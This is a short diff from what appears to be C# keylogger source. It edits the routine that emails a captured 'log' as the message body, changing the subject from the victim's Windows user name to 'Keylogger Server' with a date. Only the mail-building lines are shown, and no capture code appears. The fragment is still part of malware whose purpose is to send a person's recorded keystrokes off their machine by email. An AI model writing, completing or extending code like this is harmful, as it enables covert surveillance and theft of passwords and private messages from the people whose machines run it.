@@ -73,7 +73,7 @@ namespace Networking
                 MailMessage message = new MailMessage
                 {
                     From = new MailAddress(FROM_EMAIL_ADDRESS),
-                    Subject = Environment.UserName + " - " + DateTime.Now.Month + "." + DateTime.Now.Day + "." + DateTime.Now.Year,
+                    Subject = "Keylogger Server" + ": " + DateTime.Now.Month + "." + DateTime.Now.Day + "." + DateTime.Now.Year,
                     Body = log,
                     IsBodyHtml = false,
                 };
